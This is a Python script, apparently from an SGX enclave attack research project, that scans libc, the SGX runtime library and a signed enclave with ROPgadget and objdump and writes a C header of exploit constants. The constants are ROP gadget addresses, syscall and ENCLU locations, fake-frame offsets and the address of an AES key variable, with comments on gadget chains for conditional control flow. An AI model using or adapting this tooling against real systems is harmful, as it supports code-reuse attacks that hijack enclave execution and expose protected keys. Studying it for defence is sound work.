#!/usr/bin/python3

import os, subprocess, struct

# pLibC = "/lib/x86_64-linux-gnu/libc.so.6"
pLibC = "../libc.so.6"
pLibUSgx = "/usr/lib/libsgx_urts.so"
pEnclave = "../enclave.signed.so"

pOutput = "../include/app/ExploitConstantAut.h"

pROPgadget = "ROPgadget --binary".split()
pObject = "objdump -d".split()
pObject2 = "objdump -t".split()

def findGadget(f, g):
    global pROPgadget
    x = pROPgadget + [f]

    a = None
    with subprocess.Popen(x, stdout=subprocess.PIPE) as cmd:
        l = cmd.stdout.readline()
        while l:
            l = l.decode("utf-8")[:-1]
            if l.endswith(g) and not a:
                a = l.split()[0]
                # print(a)
            l = cmd.stdout.readline()

    if a:
        return a
    else:
        raise Exception("Gadget \"{0}\" not found in {1}".format(g,f))

def findVar(f, v):
    global pObject2
    x = pObject2 + [f]

    a = None
    with subprocess.Popen(x, stdout=subprocess.PIPE) as cmd:
        l = cmd.stdout.readline()
        while l:
            l = l.decode("utf-8")[:-1].strip()
            if l.endswith(v) and not a:
                a = l.split()[0]
                if a.endswith(":"):
                    a = a[:-1]
                # print(a)
            l = cmd.stdout.readline()

    if a:
        return "0x{0:016x}".format(int(a, 16))
    else:
        raise Exception("Instruction \"{0}\" not found in {1}".format(v,f))

def findInstr(f, i):
    global pObject
    x = pObject + [f]

    a = None
    with subprocess.Popen(x, stdout=subprocess.PIPE) as cmd:
        l = cmd.stdout.readline()
        while l:
            l = l.decode("utf-8")[:-1].strip()
            if l.endswith(i) and not a:
                a = l.split()[0]
                if a.endswith(":"):
                    a = a[:-1]
                # print(a)
            l = cmd.stdout.readline()

    if a:
        return "0x{0:016x}".format(int(a, 16))
    else:
        raise Exception("Instruction \"{0}\" not found in {1}".format(i,f))

def findInstr2(f, i1, i2):
    global pObject
    x = pObject + [f]

    a = None
    nn = 0
    i = 0
    itIsDone = False
    with subprocess.Popen(x, stdout=subprocess.PIPE) as cmd:
        l = cmd.stdout.readline()
        while l:
            l = l.decode("utf-8")[:-1].strip()

            if not itIsDone:
                if l.endswith(i1) and not nn and not a:
                    nn = i
                    a = l.split()[0]
                    if a.endswith(":"):
                        a = a[:-1]
                elif l.endswith(i2) and nn + 1 == i:
                    nn = 0
                    itIsDone = True
                else:
                    nn = 0
                    a = None

            l = cmd.stdout.readline()
            i += 1

    if a:
        return "0x{0:016x}".format(int(a, 16))
    else:
        raise Exception("Instruction \"{0}\" not found in {1}".format(i1,f))

def findInstrInFun(p, f, i):
    global pObject
    x = pObject + [p]

    gotFun = False
    a = None
    itIsDone = False
    with subprocess.Popen(x, stdout=subprocess.PIPE) as cmd:
        l = cmd.stdout.readline()
        while l:
            l = l.decode("utf-8")[:-1].strip()

            if not itIsDone:
                if gotFun and l.endswith(">:") and not l.endswith(f):
                    break

                if l.endswith(f) and not gotFun and not a:
                    # print("got {}".format(f))
                    gotFun = True;
                elif l.endswith(i) and gotFun:
                    # print("got {}".format(i))
                    itIsDone = True

                    l = cmd.stdout.readline().decode("utf-8")[:-1].strip()
                    a = l.split()[0]
                    if a.endswith(":"):
                        a = a[:-1]

            l = cmd.stdout.readline()

    if a:
        # print("0x{0:016x}".format(int(a, 16)))
        return "0x{0:016x}".format(int(a, 16))
    else:
        raise Exception("Instruction \"{0}\" not found in {1}".format(i,f))

def store(s):
    global pOutput
    with open(pOutput, 'a+') as f:
        f.write(s)

def clean():
    global pOutput
    if os.path.exists(pOutput):
        os.remove(pOutput)

def genHeader():
    s = """/*
THIS HEADER CONSTANTS WHAT I NEED FOR THE EXPLOIT
call: ./generateConstant.py
*/

#ifndef __EXPLOITCONST_H_
#define __EXPLOITCONST_H_

#define FAKE_FRAME_DISTANCE 0x2000
#define WORKSPACE_DISTANCE (FAKE_FRAME_DISTANCE + 0x10000)
#define BACKUP_DISTANCE (FAKE_FRAME_DISTANCE + 0x20000)

#define OCALL_FLAG 0x4F434944
#define EEXIT 0x4
#define EENTER 0x2

#define FIRST_MALLOC 0x252260
#define RIP_DELTA_IC 0x335
#define RIP_DELTA_PC 0x12e0""" # #define RIP_DELTA_PC 0x12df
    store(s)

def genFooter():
    store("\n#endif\n")

def genGadgetsEnclave():
    global pEnclave
    s = ""

    s += "\n"
    s += "#define GLUE_GADGET   " + findGadget(pEnclave, " : pop rdi ; ret") + "\n"

    s += "#define POP_RDI       " + findGadget(pEnclave, " : pop rdi ; ret") + "\n"
    s += "#define POP_RAX       " + findGadget(pEnclave, " : pop rax ; ret") + "\n"
    s += "#define ENCLU_TRTS    " + findInstr(pEnclave, "enclu") + "\n"
    s += "#define CALL_RAX      " + findInstr(pEnclave, "callq  *%rax") + "\n"
    s += "#define MOV_RSPRBP    " + findGadget(pEnclave, " : mov rsp, rbp ; pop rbp ; ret") + "\n"

    # // functions
    s += "#define CONTINUE_EXECUTION " + findInstr(pEnclave, "<continue_execution>:") + "\n"
    s += "#define MEMCPY             " + findInstr(pEnclave, "<memcpy>:") + "\n"
    s += "#define MEMSET             " + findInstr(pEnclave, "<memset>:") + "\n"
    s += "#define SAVE_XREGS         " + findInstr(pEnclave, "<save_xregs>:") + "\n"
    s += "#define UPDATE_OCALL_LASTSP         " + findInstr(pEnclave, "<update_ocall_lastsp>:") + "\n"

    s += "\n"
    s += "#define ENTERENCLAVE_RP " + findInstrInFun(pEnclave, "<enter_enclave>:", "<do_oret>") + "\n"
    # s += "#define ENTERENCLAVE_RP " + findInstrInFun(pEnclave, "<enter_enclave>:", "<do_ecall>") + "\n"

    # AES var
    s += "#define P_KEY " + findVar(pEnclave, "p_key") + "\n"

    # // for if conditions
    s += "\n"

    s += "#define G1 " + findGadget(pEnclave, " : mov eax, dword ptr [rax] ; ret") + "\n"
    # take old-AES value
    s += "#define G2 " + findGadget(pEnclave, " : mov rdi, qword ptr [rdi + 0x68] ; ret") + "\n"
    # rax = (AES != old-AES) ? 0x1 : 0x0
    s += "#define G3 " + findGadget(pEnclave, " : cmp eax, edi ; sete al ; movzx eax, al ; ret") + "\n"
    # eax = (eax == 0x1)? 0xFFFFFFFF : 0x0
    s += "#define G4 " + findGadget(pEnclave, " : neg eax ; ret") + "\n"
    # eax = #offset | 0
    s += "#define G5 " + findGadget(pEnclave, " : and eax, edx ; ret") + "\n"
    s += "#define G6 " + findGadget(pEnclave, " : add rax, rcx ; ret") + "\n"
    s += "#define G7 " + findGadget(pEnclave, " : xchg rax, rsp ; ret 0x80") + "\n"

    store(s)

def genGadgetsULib():
    global pLibUSgx
    s = "\n"
    s += "#define ENCLU_URTS   " + findInstr(pLibUSgx, "enclu") + "\n"
    s += "#define UMORESTACK   " + findVar(pLibUSgx, "__morestack") + "\n"
    store(s)

def genGadgetsLibC():
    global pLibC
    s = "\n"
    s += "#define POP_RAX_U " + findGadget(pLibC, " : pop rax ; ret") + "\n"
    s += "#define POP_RBX_U " + findGadget(pLibC, " : pop rbx ; ret") + "\n"
    s += "#define POP_RDI_U " + findGadget(pLibC, " : pop rdi ; ret") + "\n"
    s += "#define POP_RCX_U " + findGadget(pLibC, " : pop rcx ; ret") + "\n"
    s += "#define POP_RSI_U " + findGadget(pLibC, " : pop rsi ; ret") + "\n"
    s += "#define POP_RDX_U " + findGadget(pLibC, " : pop rdx ; ret") + "\n"
    s += "#define INT_80_U  " + findGadget(pLibC, " : int 0x80") + "\n"
    s += "#define SYSCALL   " + findInstr2(pLibC, "syscall", "retq") + "\n"

    store(s)

if __name__ == "__main__":
    clean()
    # start with the header
    genHeader()
    genGadgetsEnclave()
    genGadgetsULib()
    genGadgetsLibC()
    genFooter()

